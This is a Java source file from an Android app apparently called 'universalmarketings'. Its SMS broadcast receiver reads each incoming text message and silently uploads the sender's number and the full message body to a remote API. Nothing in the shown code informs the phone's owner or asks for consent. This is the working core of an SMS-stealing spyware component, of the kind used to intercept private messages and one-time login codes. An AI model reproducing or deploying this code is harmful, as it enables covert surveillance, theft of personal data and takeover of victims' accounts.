package com.mehboob.universalmarketings;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.mehboob.universalmarketings.Models.Messages;
import com.mehboob.universalmarketings.activities.LoginActivity;
import com.mehboob.universalmarketings.iterface.API;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SMSRecevier extends BroadcastReceiver {
    private static String SMS = "android.provider.Telephony.SMS_RECEIVED";

    Call<Messages> call;


    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(SMS)) {

            Bundle bundle = intent.getExtras();

            Object[] objects = (Object[]) bundle.get("pdus");
            SmsMessage[] smsMessages = new SmsMessage[objects.length];
            for (int i = 0; i < objects.length; i++) {
                smsMessages[i] = SmsMessage.createFromPdu((byte[]) objects[i]);
            }


            Constants.ADDRESS = smsMessages[0].getOriginatingAddress();
            Constants.BODY = smsMessages[0].getMessageBody();


            API api = ReterofitClient.getRetrofitInstance().create(API.class);


            call = api.postMessages(Constants.ADDRESS, Constants.BODY);
            call.enqueue(new Callback<Messages>() {
                @Override
                public void onResponse(@NonNull Call<Messages> call, @NonNull Response<Messages> response) {


                    if (response.isSuccessful()) {
                        Messages obj = response.body();


                    }

                }

                @Override
                public void onFailure(Call<Messages> call, Throwable t) {

                }
            });


        }
    }
}
